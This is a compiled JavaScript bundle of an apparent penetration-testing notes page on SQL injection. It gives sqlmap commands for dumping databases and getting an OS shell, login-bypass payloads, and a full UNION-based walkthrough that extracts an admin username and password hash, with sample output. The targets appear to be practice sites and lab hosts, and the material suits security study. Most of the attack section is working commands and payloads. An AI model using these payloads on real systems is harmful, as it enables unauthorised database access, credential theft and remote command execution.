(window.webpackJsonp=window.webpackJsonp||[]).push([[8],{138:function(e,t,a){"use strict";a.r(t),a.d(t,"frontMatter",(function(){return c})),a.d(t,"metadata",(function(){return l})),a.d(t,"rightToc",(function(){return s})),a.d(t,"default",(function(){return o}));var r=a(2),n=a(9),b=(a(0),a(183)),c={title:"SQL Injection",sidebar_label:"SQL Injection"},l={id:"web/sql_injection",title:"SQL Injection",description:"* sqlmap",source:"@site/docs\\web\\sql_injection.md",permalink:"/rosh/docs/web/sql_injection",sidebar_label:"SQL Injection",sidebar:"someSidebar",previous:{title:"tshark",permalink:"/rosh/docs/utilities/tshark"},next:{title:"Web Recon",permalink:"/rosh/docs/web/web_recon"}},s=[{value:"GET request",id:"get-request",children:[]},{value:"POST request",id:"post-request",children:[]},{value:"databases",id:"databases",children:[]},{value:"tables",id:"tables",children:[]},{value:"data",id:"data",children:[]},{value:"columns",id:"columns",children:[{value:"os shell",id:"os-shell",children:[]}]},{value:"INFORMATION_SCHEMA Tables",id:"information_schema-tables",children:[]},{value:"check vulnerability",id:"check-vulnerability",children:[]},{value:"enumerate fields of search query",id:"enumerate-fields-of-search-query",children:[]},{value:"enumerate databases",id:"enumerate-databases",children:[{value:"current database",id:"current-database",children:[]},{value:"using INFORMATION_SCHEMA",id:"using-information_schema",children:[]},{value:"all databases",id:"all-databases",children:[]}]},{value:"enumerate tables",id:"enumerate-tables",children:[]},{value:"enumerate columns",id:"enumerate-columns",children:[]},{value:"show data",id:"show-data",children:[]}],i={rightToc:s};function o(e){var t=e.components,a=Object(n.a)(e,["components"]);return Object(b.b)("wrapper",Object(r.a)({},i,a,{components:t,mdxType:"MDXLayout"}),Object(b.b)("ul",null,Object(b.b)("li",{parentName:"ul"},Object(b.b)("a",Object(r.a)({parentName:"li"},{href:"#sqlmap"}),Object(b.b)("inlineCode",{parentName:"a"},"sqlmap")),Object(b.b)("ul",{parentName:"li"},Object(b.b)("li",{parentName:"ul"},Object(b.b)("a",Object(r.a)({parentName:"li"},{href:"#get-request"}),"GET request")),Object(b.b)("li",{parentName:"ul"},Object(b.b)("a",Object(r.a)({parentName:"li"},{href:"#post-request"}),"POST request")),Object(b.b)("li",{parentName:"ul"},Object(b.b)("a",Object(r.a)({parentName:"li"},{href:"#databases"}),"databases")),Object(b.b)("li",{parentName:"ul"},Object(b.b)("a",Object(r.a)({parentName:"li"},{href:"#tables"}),"tables")),Object(b.b)("li",{parentName:"ul"},Object(b.b)("a",Object(r.a)({parentName:"li"},{href:"#data"}),"data")),Object(b.b)("li",{parentName:"ul"},Object(b.b)("a",Object(r.a)({parentName:"li"},{href:"#columns"}),"columns")),Object(b.b)("li",{parentName:"ul"},Object(b.b)("a",Object(r.a)({parentName:"li"},{href:"#os-shell"}),"os shell")))),Object(b.b)("li",{parentName:"ul"},Object(b.b)("a",Object(r.a)({parentName:"li"},{href:"#information_schema"}),"INFORMATION_SCHEMA"),Object(b.b)("ul",{parentName:"li"},Object(b.b)("li",{parentName:"ul"},Object(b.b)("a",Object(r.a)({parentName:"li"},{href:"#information_schema-tables"}),"INFORMATION_SCHEMA Tables")))),Object(b.b)("li",{parentName:"ul"},Object(b.b)("a",Object(r.a)({parentName:"li"},{href:"#manual-methods"}),"Manual Methods"),Object(b.b)("ul",{parentName:"li"},Object(b.b)("li",{parentName:"ul"},Object(b.b)("a",Object(r.a)({parentName:"li"},{href:"#check-vulnerability"}),"check vulnerability")),Object(b.b)("li",{parentName:"ul"},Object(b.b)("a",Object(r.a)({parentName:"li"},{href:"#enumerate-fields-of-search-query"}),"enumerate fields of search query")),Object(b.b)("li",{parentName:"ul"},Object(b.b)("a",Object(r.a)({parentName:"li"},{href:"#enumerate-databases"}),"enumerate databases")),Object(b.b)("li",{parentName:"ul"},Object(b.b)("a",Object(r.a)({parentName:"li"},{href:"#enumerate-tables"}),"enumerate tables")),Object(b.b)("li",{parentName:"ul"},Object(b.b)("a",Object(r.a)({parentName:"li"},{href:"#enumerate-columns"}),"enumerate columns")),Object(b.b)("li",{parentName:"ul"},Object(b.b)("a",Object(r.a)({parentName:"li"},{href:"#show-data"}),"show data"))))),Object(b.b)("h1",{id:"sqlmap"},Object(b.b)("inlineCode",{parentName:"h1"},"sqlmap")),Object(b.b)("p",null,"If we know the DBMS, we can use option ",Object(b.b)("inlineCode",{parentName:"p"},"--dbms=mysql")),Object(b.b)("h2",{id:"get-request"},"GET request"),Object(b.b)("pre",null,Object(b.b)("code",Object(r.a)({parentName:"pre"},{}),'sqlmap -u "http://example.com/?a=1&b=2&c=3" -p "a,b"\n')),Object(b.b)("h2",{id:"post-request"},"POST request"),Object(b.b)("pre",null,Object(b.b)("code",Object(r.a)({parentName:"pre"},{}),'sqlmap -u "http://example.com/" --data "a=1&b=2&c=3" -p "a,b" --method POST\n')),Object(b.b)("p",null,"Alternatively, copy the POST request in the intercept of burpsuite in a file and use it as follows"),Object(b.b)("pre",null,Object(b.b)("code",Object(r.a)({parentName:"pre"},{}),"$ cat web.txt\nPOST /results.php HTTP/1.1\nHost: 10.10.10.109\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nReferer: http://10.10.10.109/search.php\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 13\nConnection: close\nUpgrade-Insecure-Requests: 1\n\nsearch=killer\n")),Object(b.b)("pre",null,Object(b.b)("code",Object(r.a)({parentName:"pre"},{}),'sqlmap -r web.txt -p "search"\n')),Object(b.b)("h2",{id:"databases"},"databases"),Object(b.b)("pre",null,Object(b.b)("code",Object(r.a)({parentName:"pre"},{}),'sqlmap -u "http://testphp.vulnweb.com/listproducts.php?cat=1" --dbs \n')),Object(b.b)("h2",{id:"tables"},"tables"),Object(b.b)("pre",null,Object(b.b)("code",Object(r.a)({parentName:"pre"},{}),'sqlmap -u "http://testphp.vulnweb.com/listproducts.php?cat=1" --tables -D testdb\n')),Object(b.b)("h2",{id:"data"},"data"),Object(b.b)("pre",null,Object(b.b)("code",Object(r.a)({parentName:"pre"},{}),'sqlmap -u "http://testphp.vulnweb.com/listproducts.php?cat=1" --dump -D testdb -T users\n')),Object(b.b)("h2",{id:"columns"},"columns"),Object(b.b)("pre",null,Object(b.b)("code",Object(r.a)({parentName:"pre"},{}),'sqlmap -u "http://testphp.vulnweb.com/listproducts.php?cat=1" -D testdb -T users --columns\n')),Object(b.b)("h3",{id:"os-shell"},"os shell"),Object(b.b)("pre",null,Object(b.b)("code",Object(r.a)({parentName:"pre"},{}),'sqlmap -u "http://testphp.vulnweb.com/listproducts.php?cat=1" --os-shell\n')),Object(b.b)("h1",{id:"information_schema"},"INFORMATION_SCHEMA"),Object(b.b)("p",null,"Refs:"),Object(b.b)("ul",null,Object(b.b)("li",{parentName:"ul"},Object(b.b)("a",Object(r.a)({parentName:"li"},{href:"https://www.cmi.ac.in/~madhavan/courses/databases10/mysql-5.0-reference-manual/information-schema.html#schemata-table"}),"https://www.cmi.ac.in/~madhavan/courses/databases10/mysql-5.0-reference-manual/information-schema.html#schemata-table"))),Object(b.b)("p",null,"INFORMATION_SCHEMA provides access to database metadata."),Object(b.b)("p",null,"Metadata is data about the data, such as the name of a database or table, the data type of a column, or access privileges. INFORMATION_SCHEMA is the information database, the place that stores information about all the other databases that the MySQL server maintains. Inside INFORMATION_SCHEMA there are several read-only tables. They are actually views, not base tables, so there are no files associated with them."),Object(b.b)("h2",{id:"information_schema-tables"},"INFORMATION_SCHEMA Tables"),Object(b.b)("ul",null,Object(b.b)("li",{parentName:"ul"},Object(b.b)("a",Object(r.a)({parentName:"li"},{href:"https://dev.mysql.com/doc/refman/8.0/en/columns-table.html"}),"https://dev.mysql.com/doc/refman/8.0/en/columns-table.html")),Object(b.b)("li",{parentName:"ul"},Object(b.b)("a",Object(r.a)({parentName:"li"},{href:"https://dev.mysql.com/doc/refman/8.0/en/schemata-table.html"}),"https://dev.mysql.com/doc/refman/8.0/en/schemata-table.html")),Object(b.b)("li",{parentName:"ul"},Object(b.b)("a",Object(r.a)({parentName:"li"},{href:"https://dev.mysql.com/doc/refman/8.0/en/st-units-of-measure-table.html"}),"https://dev.mysql.com/doc/refman/8.0/en/st-units-of-measure-table.html"))),Object(b.b)("h1",{id:"manual-methods"},"Manual Methods"),Object(b.b)("h2",{id:"check-vulnerability"},"check vulnerability"),Object(b.b)("pre",null,Object(b.b)("code",Object(r.a)({parentName:"pre"},{}),"' or 1='1\n' or 1=1;--\n' or 1=1;#\n') or ('x'='x\n' or like '%';--\n' or 1=1 LIMIT 1;--\n\nUSERNAME: ' or 1/*\nPASSWORD: */ =1 --\n\nUSERNAME: admin' or 'a'='a\nPASSWORD '#\n")),Object(b.b)("h2",{id:"enumerate-fields-of-search-query"},"enumerate fields of search query"),Object(b.b)("p",null,"In burpsuite, go to repeater mode and keep on increasing the numbers till the fields of search query gets printed on the webpage"),Object(b.b)("pre",null,Object(b.b)("code",Object(r.a)({parentName:"pre"},{}),"search=killer' UNION SELECT 1,2,3,4,5,6-- -\n")),Object(b.b)("pre",null,Object(b.b)("code",Object(r.a)({parentName:"pre"},{}),"<h3>Search results </h3>\nID: 1<br/>Name: 2 3<br/>Position: 4<br />Phone No: 5<br />Email: 6<br/>\n")),Object(b.b)("h2",{id:"enumerate-databases"},"enumerate databases"),Object(b.b)("h3",{id:"current-database"},"current database"),Object(b.b)("pre",null,Object(b.b)("code",Object(r.a)({parentName:"pre"},{}),"search=killer' UNION SELECT database(),2,3,4,5,6-- -\n")),Object(b.b)("pre",null,Object(b.b)("code",Object(r.a)({parentName:"pre"},{}),"<h3>Search results </h3> \nID: Staff<br/>Name: 2 3<br/>Position: 4<br />Phone No: 5<br />Email: 6<br/>\n")),Object(b.b)("h3",{id:"using-information_schema"},"using INFORMATION_SCHEMA"),Object(b.b)("pre",null,Object(b.b)("code",Object(r.a)({parentName:"pre"},{}),"search=killer' UNION SELECT SCHEMA_NAME,2,3,4,5,6 FROM INFORMATION_SCHEMA.SCHEMATA-- -\n")),Object(b.b)("pre",null,Object(b.b)("code",Object(r.a)({parentName:"pre"},{}),"<h3>Search results </h3> \nID: information_schema<br/>Name: 2 3<br/>Position: 4<br />Phone No: 5<br />Email: 6<br/><br/>ID: Staff<br/>Name: 2 3\n<br/>Position: 4<br />Phone No: 5<br />Email: 6<br/><br/>ID: users<br/>Name: 2 3<br/>Position: 4<br />Phone No: 5<br />Email:\n6<br/>\n")),Object(b.b)("h3",{id:"all-databases"},"all databases"),Object(b.b)("pre",null,Object(b.b)("code",Object(r.a)({parentName:"pre"},{}),"search=killer' UNION SELECT GROUP_CONCAT(SCHEMA_NAME),2,3,4,5,6 FROM INFORMATION_SCHEMA.SCHEMATA-- -\n")),Object(b.b)("pre",null,Object(b.b)("code",Object(r.a)({parentName:"pre"},{}),"<h3>Search results </h3>\nID: information_schema,Staff,users<br/>Name: 2 3<br/>Position: 4<br />Phone No: 5<br />Email: 6<br/>\n")),Object(b.b)("h2",{id:"enumerate-tables"},"enumerate tables"),Object(b.b)("pre",null,Object(b.b)("code",Object(r.a)({parentName:"pre"},{}),'search=killer\' UNION SELECT GROUP_CONCAT(TABLE_NAME),2,3,4,5,6 FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA="Staff"-- -\n')),Object(b.b)("pre",null,Object(b.b)("code",Object(r.a)({parentName:"pre"},{}),"<h3>Search results </h3> \nID: StaffDetails,Users<br/>Name: 2 3<br/>Position: 4<br />Phone No: 5<br />Email: 6<br/>\n")),Object(b.b)("h2",{id:"enumerate-columns"},"enumerate columns"),Object(b.b)("pre",null,Object(b.b)("code",Object(r.a)({parentName:"pre"},{}),'search=killer\' UNION SELECT GROUP_CONCAT(COLUMN_NAME),2,3,4,5,6 FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA="Staff" AND TABLE_NAME="Users"-- -\n')),Object(b.b)("pre",null,Object(b.b)("code",Object(r.a)({parentName:"pre"},{}),"<h3>Search results </h3>\nID: UserID,Username,Password<br/>Name: 2 3<br/>Position: 4<br />Phone No: 5<br />Email: 6<br/>\n")),Object(b.b)("h2",{id:"show-data"},"show data"),Object(b.b)("pre",null,Object(b.b)("code",Object(r.a)({parentName:"pre"},{}),'search=killer\' UNION SELECT GROUP_CONCAT(Username,":",Password),2,3,4,5,6 FROM Staff.Users-- -\n')),Object(b.b)("pre",null,Object(b.b)("code",Object(r.a)({parentName:"pre"},{}),"<h3>Search results </h3>\nID: admin:856f5de590ef37314e7c3bdf6f8a66dc<br/>Name: 2 3<br/>Position: 4<br />Phone No: 5<br />Email: 6<br/>\n")))}o.isMDXComponent=!0},183:function(e,t,a){"use strict";a.d(t,"a",(function(){return p})),a.d(t,"b",(function(){return O}));var r=a(0),n=a.n(r);function b(e,t,a){return t in e?Object.defineProperty(e,t,{value:a,enumerable:!0,configurable:!0,writable:!0}):e[t]=a,e}function c(e,t){var a=Object.keys(e);if(Object.getOwnPropertySymbols){var r=Object.getOwnPropertySymbols(e);t&&(r=r.filter((function(t){return Object.getOwnPropertyDescriptor(e,t).enumerable}))),a.push.apply(a,r)}return a}function l(e){for(var t=1;t<arguments.length;t++){var a=null!=arguments[t]?arguments[t]:{};t%2?c(Object(a),!0).forEach((function(t){b(e,t,a[t])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(a)):c(Object(a)).forEach((function(t){Object.defineProperty(e,t,Object.getOwnPropertyDescriptor(a,t))}))}return e}function s(e,t){if(null==e)return{};var a,r,n=function(e,t){if(null==e)return{};var a,r,n={},b=Object.keys(e);for(r=0;r<b.length;r++)a=b[r],t.indexOf(a)>=0||(n[a]=e[a]);return n}(e,t);if(Object.getOwnPropertySymbols){var b=Object.getOwnPropertySymbols(e);for(r=0;r<b.length;r++)a=b[r],t.indexOf(a)>=0||Object.prototype.propertyIsEnumerable.call(e,a)&&(n[a]=e[a])}return n}var i=n.a.createContext({}),o=function(e){var t=n.a.useContext(i),a=t;return e&&(a="function"==typeof e?e(t):l(l({},t),e)),a},p=function(e){var t=o(e.components);return n.a.createElement(i.Provider,{value:t},e.children)},m={inlineCode:"code",wrapper:function(e){var t=e.children;return n.a.createElement(n.a.Fragment,{},t)}},u=n.a.forwardRef((function(e,t){var a=e.components,r=e.mdxType,b=e.originalType,c=e.parentName,i=s(e,["components","mdxType","originalType","parentName"]),p=o(a),u=r,O=p["".concat(c,".").concat(u)]||p[u]||m[u]||b;return a?n.a.createElement(O,l(l({ref:t},i),{},{components:a})):n.a.createElement(O,l({ref:t},i))}));function O(e,t){var a=arguments,r=t&&t.mdxType;if("string"==typeof e||r){var b=a.length,c=new Array(b);c[0]=u;var l={};for(var s in t)hasOwnProperty.call(t,s)&&(l[s]=t[s]);l.originalType=e,l.mdxType="string"==typeof e?e:r,c[1]=l;for(var i=2;i<b;i++)c[i]=a[i];return n.a.createElement.apply(null,c)}return n.a.createElement.apply(null,a)}u.displayName="MDXCreateElement"}}]);